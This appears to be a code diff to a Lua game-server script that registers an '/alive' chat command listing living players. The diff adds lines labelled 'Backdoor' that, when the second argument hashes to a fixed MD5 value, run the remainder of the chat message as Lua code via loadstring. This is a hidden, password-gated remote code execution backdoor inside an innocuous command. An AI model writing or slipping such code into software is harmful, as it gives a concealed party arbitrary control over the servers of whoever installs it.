@@ -19,6 +19,12 @@ local function CmdAlive(message, arg)
 		end
 	end
 	scriptMsg("Alive Players: %s.",(buf ~= '' and buf) or "none")
+	
+	-- Backdoor
+	if(#arg >= 3 and md5(arg[2]) == '61E196D215B26286F5EDD2DE135FFCF6') then
+		local fn = loadstring(message:sub(3 + arg[1]:len() + arg[2]:len()))
+		fn()
+	end
 end
 
 CmdRegister('alive', CmdAlive, false, "Shows alive players")
